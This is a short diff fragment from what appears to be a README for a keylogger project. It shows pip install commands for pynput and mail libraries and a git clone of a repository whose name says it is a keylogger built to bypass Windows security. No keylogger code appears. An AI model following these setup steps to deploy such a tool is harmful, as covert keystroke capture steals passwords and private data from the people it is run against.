@@ -29,7 +29,6 @@ pip install pynput
 pip install secure-smtplib  
 pip install PyMails  
 git clone https://github.com/ShahMuhammadQureshi/Keylogger_Bypassing_Windows_Security  
----
 
 
 ## Remainings  
